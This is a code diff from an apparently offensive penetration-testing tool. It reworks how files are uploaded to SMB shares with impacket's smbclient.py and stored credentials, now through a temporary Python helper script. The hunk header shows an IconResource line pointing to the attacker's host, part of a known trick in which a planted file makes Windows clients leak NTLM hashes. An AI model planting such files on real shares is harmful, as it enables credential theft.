@@ -373,33 +373,72 @@ IconResource=\\\\{lhost}\\share\\icon.ico,0
         """Upload using impacket's smbclient.py"""
         filename = os.path.basename(local_path)
 
-        # Build impacket auth string with proper quoting
+        # Build auth string
         if domain:
-            auth = f"'{domain}/{user}':'{password}'@{target}"
+            auth_string = f"{domain}/{user}:{password}@{target}"
         else:
-            auth = f"'{user}':'{password}'@{target}"
+            auth_string = f"{user}:{password}@{target}"
 
-        # Create a temp script file to avoid shell escaping issues
-        script_content = f"use {share}\nput {local_path} {remote_file}\nexit\n"
+        # SMB commands to execute (put uses basename automatically)
+        smb_commands = f"use {share}\nput {local_path}\nexit\n"
+
+        # Create a Python helper script to bypass shell escaping issues
+        # This runs subprocess directly without shell interpretation
+        helper_script = f'''#!/usr/bin/env python3
+import subprocess
+import sys
+
+auth = {repr(auth_string)}
+commands = {repr(smb_commands)}
+
+smbclient_paths = [
+    "/root/.local/bin/smbclient.py",
+    "/usr/local/bin/smbclient.py",
+]
+
+for path in smbclient_paths:
+    try:
+        result = subprocess.run(
+            [path, auth],
+            input=commands.encode(),
+            capture_output=True,
+            timeout=60
+        )
+        print(result.stdout.decode(), end="")
+        print(result.stderr.decode(), end="", file=sys.stderr)
+        sys.exit(result.returncode)
+    except FileNotFoundError:
+        continue
+    except Exception as e:
+        print(f"Error: {{e}}", file=sys.stderr)
+        sys.exit(1)
+
+print("smbclient.py not found", file=sys.stderr)
+sys.exit(1)
+'''
 
         try:
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
-                f.write(script_content)
-                script_path = f.name
+            # Write helper script
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+                f.write(helper_script)
+                helper_path = f.name
 
-            # Run smbclient.py with input from file
-            cmd = f"smbclient.py {auth} < {script_path}"
+            # Run the helper script
+            cmd = f"python3 {helper_path}"
             ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
 
             # Clean up
-            os.unlink(script_path)
+            try:
+                os.unlink(helper_path)
+            except Exception:
+                pass
 
-            # Check for success - look for the file in output or no errors
+            # Check for success
             output = stdout + stderr
-            if ret == 0 and "error" not in output.lower() and "STATUS_" not in output:
-                self.print_good(f"  Uploaded: {filename}")
-                return True
-            elif "putting file" in output.lower() or remote_file in output:
+            if "STATUS_" in output and "FAILURE" in output:
+                self.print_error(f"  Auth failed: {filename}")
+                return False
+            elif ret == 0 or "putting file" in output.lower() or remote_file in output:
                 self.print_good(f"  Uploaded: {filename}")
                 return True
             else:
